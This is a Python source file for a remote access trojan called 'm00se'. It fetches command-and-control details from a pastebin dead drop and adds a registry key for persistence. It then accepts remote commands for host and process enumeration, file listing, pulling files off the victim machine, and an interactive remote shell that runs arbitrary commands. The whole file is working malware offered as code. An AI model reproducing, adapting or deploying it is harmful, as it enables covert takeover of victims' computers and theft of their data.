from modules.c2 import client, server, dead_drop
from modules.recon import enum_host, get_ip
from modules.persistence import registry
from subprocess import PIPE, Popen
import os
import sys
import requests

class m00se():

    def __init__(self):
        self.url = 'https://pastebin.com/raw/KWB794Yy'
        self.ip, self.port = dead_drop.get_C2_info(self.url)
        self.client = client.C2_Client(self.ip, self.port)
        self.socket = self.client.connect()
        self.shell = False

    def main(self):
        registry.add_registry_key()
        while True:
            command = self.client.receive_message().decode()

            if command == "ip":
                print("Getting host IP")
                ip = get_ip.get_ip()
                self.client.send_message(ip)

            if command == "host_info":
                print('Enumerating host info')
                info = enum_host.get_host_info()
                self.client.send_message(info)

            if command == "processes":
                print("Getting processes")
                proc = enum_host.get_running_processes()
                for p in proc:
                    self.client.send_message(p)
                self.client.send_message("END")

            if command == "list":
                print('Getting file list')
                files = enum_host.list_files()
                self.client.send_message(files)

            if command == "shell":
                self.shell = True
                self.client.send_message("Shell spawned*-*{}".format(os.getcwd()))
                while self.shell:
                    cmd = self.client.receive_message().decode()
                    if cmd == "exit" or cmd == "quit":
                        self.client.send_message("Shell exited")
                        self.shell = False
                        break
                    elif cmd.startswith("cd"):
                        try:
                            os.chdir(cmd.split(' ')[1])
                            self.client.send_message(' *-*{}'.format(os.getcwd()))
                        except:
                            self.client.send_message('Failed.')
                    else:
                        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
                        stdout, stderr = p.communicate()
                        if stdout:
                            self.client.send_message(stdout.decode())
                        elif stderr:
                            self.client.send_message(stderr.decode())
                        else:
                            self.client.send_message("OK")

            if command.startswith("download"):
                file = command.split(' ')[1]
                if file in os.listdir():
                    with open(file, 'rb') as file_to_send:
                        for data in file_to_send:
                            self.client.send_message(data)
                    self.client.send_message("END")

            else:
                self.client.send_message("Command not recognised.")




if __name__ == '__main__':
    m = m00se()
    m.main()
